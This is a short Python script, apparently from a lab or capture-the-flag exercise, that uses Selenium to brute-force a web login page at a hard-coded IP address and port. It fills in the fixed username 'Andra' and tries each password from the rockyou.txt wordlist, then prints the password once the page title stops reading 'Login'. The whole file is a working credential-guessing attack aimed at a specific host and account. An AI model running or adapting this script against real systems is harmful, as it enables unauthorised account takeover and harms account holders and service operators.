from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By

driver = webdriver.Firefox()



website = "http://141.87.56.39:8080/login"

driver.get(website)

titles=""

with open('./rockyou.txt',  encoding='utf-8', errors='ignore') as pwList: #ISO-8859-1
   passwords = pwList.readlines()

print(len(passwords))

i = 0

for password in passwords:
    driver.get(website)
    print("Testing this password: ", password)
    
    res = driver.find_elements(By.CLASS_NAME, value="form-control")
    print(len(res))
    #assert(len(res) == 2)
    res[0].clear()
    res[0].send_keys("Andra")
    res[1].clear()
    res[1].send_keys(password)

    button = driver.find_elements(By.CLASS_NAME, value="btn")
    #assert?!
    button[0].click()

    title_ = driver.title
    print(title_)

    if title_ != "Login":
        print("-------------")
        print(f"Password is {password}")
        break

driver.quit()